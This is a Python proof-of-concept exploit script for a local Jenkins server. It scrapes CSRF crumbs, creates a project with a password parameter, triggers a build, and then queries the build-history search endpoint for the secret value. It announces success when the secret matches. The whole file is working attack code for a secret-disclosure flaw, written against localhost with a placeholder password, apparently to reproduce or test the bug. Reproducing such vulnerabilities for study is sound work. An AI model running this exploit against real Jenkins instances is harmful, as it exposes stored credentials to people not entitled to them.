#!/usr/bin/env python3
import json
import requests
import time
from bs4 import BeautifulSoup

hosturl = "http://localhost:8080"


# Extract crumb from a html
def extractCrumb(html):
    soup = BeautifulSoup(html, "html.parser")
    headtag = soup.find("head")
    return (headtag["data-crumb-header"], headtag["data-crumb-value"])


def createProject(prjName):
    global hosturl
    pageurl = f"{hosturl}/jenkins/newJob"
    posturl = f"{hosturl}/jenkins/createItem"
    session = requests.Session()
    crumb = extractCrumb(session.get(pageurl).text)

    payload = {
        crumb[0]: crumb[1],
        "name": prjName,
        "mode": "hudson.model.FreeStyleProject",
    }
    res = session.post(posturl, data=payload)
    if res.ok:
        print("Create Project Succeed")
    else:
        print("Create Project Skipped")


def configProject(session, prjName):
    global hosturl
    pageurl = f"{hosturl}/jenkins/job/{prjName}/configure"
    posturl = f"{hosturl}/jenkins/job/{prjName}/configSubmit"

    crumb = extractCrumb(session.get(pageurl).text)

    formdata = {
        "enable": True,
        "properties": {
            "stapler-class-bag": "true",
            "hudson-model-ParametersDefinitionProperty": {
                "specified": True,
                "parameterDefinitions": {
                    "stapler-class": "hudson.model.PasswordParameterDefinition",
                    "$class": "hudson.model.PasswordParameterDefinition",
                    "name": "test",
                    "defaultValueAsSecret": "test123",
                    "$redact": "defaultValueAsSecret",
                    "description": ""
                },
                "": ""
            }
        },
    }
    payload = {crumb[0]: crumb[1], "json": json.dumps(formdata)}

    res = session.post(posturl, data=payload)

    if res.status_code == 200:
        print("Config Project Succeed")
    else:
        raise RuntimeError("Config Project Failed")


def buildProject(prjName, session):
    global hosturl
    pageurl = f"{hosturl}/jenkins/job/{prjName}"
    posturl = f"{hosturl}/jenkins/job/{prjName}/build?delay=0sec"

    crumb = extractCrumb(session.get(pageurl).text)
    formdata = {
        "parameter": {
            "name": "test",
            "value": "<DEFAULT>",
            "$redact": "value"
        }
    }
    payload = {
        crumb[0]: crumb[1],
        "json": json.dumps(formdata)
    }
    res = session.post(posturl, data=payload)
    if res.ok:
        print("Build succeed")
        time.sleep(2)  # Sleep to wait until build finished.
    else:
        raise RuntimeError("Build Failed")


def check(session, prjName):
    global hosturl

    posturl = f"{hosturl}/jenkins/job/{prjName}/buildHistory/ajax?search=test123"

    res = session.get(posturl)
    if res.status_code == 200:
        print('!!! Exploit Succeed !!!')
    else:
        raise RuntimeError("Exploit Error !!!!")


prjName = "project"
session = requests.Session()
createProject(prjName)
configProject(session, prjName)

buildProject(prjName, session)
check(session, prjName)
time.sleep(2)

